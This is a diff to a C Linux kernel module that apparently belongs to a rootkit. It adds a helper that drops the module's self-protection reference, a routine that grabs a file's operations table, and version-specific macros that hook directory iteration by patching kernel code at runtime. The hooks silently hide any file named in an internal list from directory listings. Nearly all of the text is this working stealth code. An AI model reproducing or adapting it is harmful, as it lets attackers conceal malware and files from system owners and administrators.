@@ -457,3 +457,90 @@ void protect(void)
         is_protected = 1;
     }
 }
+
+void unprotected(void)
+{
+    if (!is_protected){
+        return;
+    }
+
+    module_put(THIS_MODULE);
+
+    is_protected = 0;
+}
+
+
+struct file_operations *got_fop(const char *path)
+{
+    struct file *file;
+
+    if ((file = filp_open(path, O_RDONLY, 0)) == NULL) {
+        return NULL;
+    }
+
+    struct file_operations *ret = (struct file_operations *) file->f_op;
+
+    filp_close(file, 0);
+
+    return ret;
+}
+
+#define FILLDIR_START(NAME) \
+    filldir_t original_##NAME##_filldir; \
+    \
+    static int NAME##_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
+    {
+
+#define FILLDIR_END(NAME) \
+        return original_##NAME##_filldir(context, name, namelen, offset, ino, d_type); \
+    }
+
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
+
+    #define READDIR(NAME) \
+        int NAME##_iterate(struct file *file, struct dir_context *context) \
+        { \
+            original_##NAME##_filldir = context->actor; \
+            *((filldir_t*)&context->actor) = NAME##_filldir; \
+            \
+            int (*original_iterate)(struct file *, struct dir_context *); \
+            original_iterate = asm_hook_unpatch(NAME##_iterate); \
+            int ret = original_iterate(file, context); \
+            asm_hook_patch(NAME##_iterate); \
+            \
+            return ret; \
+        }
+
+#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
+
+    #define READDIR(NAME) \
+        int NAME##_readdir(struct file *file, void *dirent, filldir_t filldir) \
+        { \
+            original_##NAME##_filldir = filldir; \
+            \
+            int (*original_readdir)(struct file *, void *, filldir_t); \
+            original_readdir = asm_hook_unpatch(NAME##_readdir); \
+            int ret = original_readdir(file, dirent, NAME##_filldir); \
+            asm_hook_patch(NAME##_readdir); \
+            \
+            return ret; \
+        }
+#else
+
+#endif
+
+//macros to use actually
+#define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
+#define READDIR_HOOK_END(NAME) FILLDIR_END(NAME) READDIR(NAME)
+
+READDIR_HOOK_START(root)
+    struct file_entry *f;
+
+    list_for_each_entry(f, &file_list, list) {
+        if (strcmp(name, f->name) == 0) {
+            return 0;
+        }
+    }
+READDIR_HOOK_END(root)
